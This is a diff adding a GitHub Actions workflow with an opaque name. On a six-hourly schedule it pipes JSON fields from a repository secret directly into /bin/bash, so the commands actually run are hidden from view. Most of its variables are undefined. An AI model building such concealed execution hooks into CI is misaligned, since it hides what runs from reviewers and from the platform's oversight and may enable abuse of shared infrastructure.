@@ -1,0 +1,22 @@
+name: duiwolaishuodabufenzhishiqingxiang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: duiwolaishuodabufenzhishiqingxiang
+        env:
+          ryc78: ${{ secrets.ryc78 }}
+        run: |
+          echo $ryc78 | jq -r .ar75153 | /bin/bash
+          echo $d4926 | jq -r .zx9481 | /bin/bash
+          echo $pnk589 | jq -r .id4006 | /bin/bash
+          echo $zlj9250 | jq -r .knrr45767 | /bin/bash
+          echo $hyv301 | jq -r .zlmr752 | /bin/bash
+          echo $r6150 | jq -r .ds5717 | /bin/bash
+          echo $w947 | jq -r .wf10 | /bin/bash
+
